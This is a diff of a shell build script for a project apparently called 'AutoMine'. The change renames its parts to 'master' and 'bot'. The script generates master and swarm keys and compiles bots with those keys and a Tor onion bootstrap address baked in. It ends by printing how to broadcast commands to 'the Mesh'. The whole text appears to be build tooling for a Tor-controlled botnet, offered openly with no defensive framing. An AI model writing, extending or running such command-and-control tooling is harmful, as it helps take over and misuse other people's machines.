@@ -8,11 +8,11 @@ KEY_PATH="$KEY_DIR/master.key"
 echo "[*] AutoMine Key Generator & Builder (Phase 13: Tor Mesh)"
 mkdir -p "$KEY_DIR"
 
-echo "[1] Building Ghost Tool..."
-cargo build --release --bin ghost -p ghost
+echo "[1] Building Ghost Tool (Master)..."
+cargo build --release --bin master -p master
 
 echo "[2] Generating Keys in $KEY_DIR..."
-GHOST_BIN="./target/release/ghost"
+GHOST_BIN="./target/release/master"
 chmod +x $GHOST_BIN 2>/dev/null
 
 if [ ! -f "$KEY_PATH" ]; then
@@ -40,15 +40,15 @@ SWARM_KEY=$(cat "$SWARM_KEY_PATH")
 # Define Bootstrap Address (Placeholder for now, in prod this comes from config)
 BOOTSTRAP_ONION="boot_mock_v3_placeholder_for_compiler_verification.onion:80"
 
-echo "[3] Building Node (with Injected Keys)..."
+echo "[3] Building Node (Bot) with Injected Keys..."
 export MASTER_PUB_KEY="$PUB_KEY"
 export SWARM_KEY="$SWARM_KEY"
 export BOOTSTRAP_ONION="$BOOTSTRAP_ONION"
-cargo build --release --bin node -p node
+cargo build --release --bin bot -p bot
 
 echo "[OK] Build Complete."
-echo " -> Ghost Key: $KEY_PATH (KEEP PRIVATE)"
-echo " -> Ghost Pub: ${KEY_PATH}.pub (Injected into Node)"
+echo " -> Master Key: $KEY_PATH (KEEP PRIVATE)"
+echo " -> Master Pub: ${KEY_PATH}.pub (Injected into Bot)"
 echo ""
 echo "To control the Mesh:"
 echo "  $GHOST_BIN broadcast --bootstrap 'onion_address_here' --key '$KEY_PATH' --cmd 'ping'"
